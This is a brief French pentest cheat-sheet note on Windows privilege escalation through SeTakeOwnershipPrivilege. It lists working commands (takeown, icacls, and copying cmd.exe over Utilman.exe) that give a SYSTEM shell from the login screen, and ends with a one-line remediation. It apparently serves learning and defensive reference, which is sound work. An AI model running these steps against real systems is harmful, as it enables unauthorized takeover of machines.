---
technique: "SeTakeOwnership"
os: Windows
categorie: PrivEsc
tags: [technique, privesc, windows, token]
rooms: []
---

# SeTakeOwnership

## Principe
> `SeTakeOwnershipPrivilege` permet de **devenir propriétaire de n'importe quel fichier**, puis de se réattribuer les droits dessus. On prend possession d'un exécutable qui tourne en SYSTEM (ex. `utilman.exe`, un binaire de service) et on le remplace.

## Vérifier
```cmd
whoami /priv
:: SeTakeOwnershipPrivilege présent
```

## Exploitation (exemple utilman.exe)
```cmd
:: 1. Prendre possession du fichier cible
takeown /f C:\Windows\System32\Utilman.exe
:: 2. S'accorder les pleins droits
icacls C:\Windows\System32\Utilman.exe /grant <user>:F
:: 3. Remplacer par cmd.exe
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
:: 4. Déclencher Utilman depuis l'écran de login (Ease of Access) → cmd SYSTEM
```

## Remédiation
- Ne pas accorder SeTakeOwnership à des comptes non-admin ; surveiller les modifs de binaires système.
